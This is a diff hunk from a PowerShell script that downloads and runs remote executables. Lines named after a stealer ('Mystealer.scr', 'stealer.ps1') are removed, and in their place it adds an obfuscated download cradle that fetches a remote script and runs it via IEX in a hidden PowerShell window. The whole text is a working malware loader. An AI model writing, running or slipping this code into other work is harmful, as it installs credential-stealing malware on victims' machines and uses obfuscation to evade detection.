@@ -77,12 +77,6 @@ $output = "$dir\pysil0n.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process $output
 
-$url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
-$output = "$dir\Updateclientt.scr"
-Invoke-WebRequest -Uri $url -OutFile $output
-Start-Process $output
-
-$url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/haha.exe"
-$output = "$dir\Mystealer.scr"
-Invoke-WebRequest -Uri $url -OutFile $output
-Start-Process $output
+$shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/stealer.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
